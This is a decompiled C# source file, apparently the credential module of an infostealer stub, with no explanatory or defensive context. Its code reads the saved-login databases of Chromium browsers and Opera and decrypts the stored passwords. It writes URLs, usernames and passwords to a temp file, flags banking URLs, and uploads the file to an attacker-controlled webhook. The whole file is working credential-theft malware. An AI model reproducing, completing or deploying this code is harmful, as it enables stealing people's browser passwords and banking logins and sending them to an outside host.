using System;
using System.Collections.Generic;
using System.IO;
using System.Net.Http;

namespace Stub
{
	// Token: 0x0200001E RID: 30
	public static class Password
	{
		// Token: 0x0200001F RID: 31
		public class passwords
		{
			// Token: 0x06000056 RID: 86 RVA: 0x00005E6C File Offset: 0x0000406C
			private static string FormatPassword(Stub.Password.passwords.Password pPassword)
			{
				string result;
				if (string.IsNullOrEmpty(pPassword.sUsername) || string.IsNullOrEmpty(pPassword.sPassword))
				{
					result = "";
				}
				else
				{
					result = string.Format("Url: {0}\nUsername: {1}\nPassword: {2}\n", pPassword.sUrl, pPassword.sUsername, pPassword.sPassword);
				}
				return result;
			}

			// Token: 0x06000057 RID: 87 RVA: 0x00005EC0 File Offset: 0x000040C0
			public static string retrievePasswords()
			{
				File.WriteAllText(Program.tempFolder + "\\passwords.txt", "\n");
				foreach (string text in Program.Paths.sChromiumPswPaths)
				{
					string path;
					if (text.Contains("Opera Software"))
					{
						path = Program.Paths.appdata + text;
					}
					else
					{
						path = Program.Paths.lappdata + text;
					}
					if (Directory.Exists(path))
					{
						foreach (string str in Directory.GetDirectories(path))
						{
							List<Stub.Password.passwords.Password> passwords = Stub.Password.passwords.GetPasswords(str + "\\Login Data");
							if (passwords.Count > 0)
							{
								foreach (Stub.Password.passwords.Password pPassword in passwords)
								{
									Console.WriteLine(Stub.Password.passwords.FormatPassword(pPassword));
									File.AppendAllText(Program.tempFolder + "\\passwords.txt", Stub.Password.passwords.FormatPassword(pPassword));
								}
							}
						}
					}
				}
				return Stub.Password.passwords.RetrievePass();
			}

			// Token: 0x06000058 RID: 88 RVA: 0x00005FE4 File Offset: 0x000041E4
			public static List<Stub.Password.passwords.Password> GetPasswords(string sLoginData)
			{
				List<Stub.Password.passwords.Password> result;
				try
				{
					List<Stub.Password.passwords.Password> list = new List<Stub.Password.passwords.Password>();
					Plugin.SQLite sqlite = Plugin.SqlReader.ReadTable(sLoginData, "logins");
					if (sqlite == null)
					{
						result = list;
					}
					else
					{
						for (int i = 0; i < sqlite.GetRowCount(); i++)
						{
							Stub.Password.passwords.Password item = default(Stub.Password.passwords.Password);
							item.sUrl = Plugin.Crypto.GetUTF8(sqlite.GetValue(i, 0));
							item.sUsername = Plugin.Crypto.GetUTF8(sqlite.GetValue(i, 3));
							string value = sqlite.GetValue(i, 5);
							if (value != null)
							{
								item.sPassword = Plugin.Crypto.GetUTF8(Plugin.Crypto.EasyDecrypt(sLoginData, value));
								list.Add(item);
								Plugin.Banking.ScanData(item.sUrl);
							}
						}
						result = list;
					}
				}
				catch
				{
					result = new List<Stub.Password.passwords.Password>();
				}
				return result;
			}

			// Token: 0x06000059 RID: 89 RVA: 0x000060A8 File Offset: 0x000042A8
			public static string RetrievePass()
			{
				string path = Program.tempFolder + "\\passwords.txt";
				File.ReadAllText(path);
				return Functions.CreateDownloadLink(Program.tempFolder + "\\passwords.txt");
			}

			// Token: 0x0600005A RID: 90 RVA: 0x000060E0 File Offset: 0x000042E0
			public static void SendPasswordFile()
			{
				string webhookURL = Program.WebhookURL;
				string path = Program.tempFolder + "\\passwords.txt";
				using (HttpClient httpClient = new HttpClient())
				{
					MultipartFormDataContent multipartFormDataContent = new MultipartFormDataContent();
					byte[] array = File.ReadAllBytes(path);
					multipartFormDataContent.Add(new ByteArrayContent(array, 0, array.Length), "Document", "passwords.txt");
					httpClient.PostAsync(webhookURL, multipartFormDataContent).Wait();
					httpClient.Dispose();
				}
			}

			// Token: 0x02000020 RID: 32
			public struct Password
			{
				// Token: 0x17000001 RID: 1
				// (get) Token: 0x0600005C RID: 92 RVA: 0x000027EC File Offset: 0x000009EC
				// (set) Token: 0x0600005D RID: 93 RVA: 0x000027F4 File Offset: 0x000009F4
				public string sUrl { get; set; }

				// Token: 0x17000002 RID: 2
				// (get) Token: 0x0600005E RID: 94 RVA: 0x000027FD File Offset: 0x000009FD
				// (set) Token: 0x0600005F RID: 95 RVA: 0x00002805 File Offset: 0x00000A05
				public string sUsername { get; set; }

				// Token: 0x17000003 RID: 3
				// (get) Token: 0x06000060 RID: 96 RVA: 0x0000280E File Offset: 0x00000A0E
				// (set) Token: 0x06000061 RID: 97 RVA: 0x00002816 File Offset: 0x00000A16
				public string sPassword { get; set; }
			}
		}
	}
}
